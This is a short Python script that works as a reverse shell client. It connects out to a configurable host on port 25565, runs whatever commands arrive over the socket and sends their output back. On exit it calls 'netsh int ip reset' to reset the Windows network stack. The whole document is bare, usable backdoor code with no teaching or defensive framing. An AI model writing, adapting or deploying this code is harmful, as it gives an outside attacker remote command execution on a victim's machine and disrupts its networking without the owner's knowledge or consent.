#!/usr/bin/python
import socket, sys, atexit
from os import chdir
from subprocess import check_output, call
s = socket.socket()
host = ''
port = 25565

def cleanup():
    call(['netsh int ip reset resetlog.txt',])

def parse_input(input_string):
    if 'cd' in input_string:
        path = input_string.split(" ")
        chdir(path[1])
    else:
        s.send(check_output(input_string))
try:
    s.connect((host,port))
    while True:
        parse_input(s.recv(1024))
    s.close()
except Exception as e:
    s.send("\n Connection Closed")
    s.close()
atexit.register(cleanup)
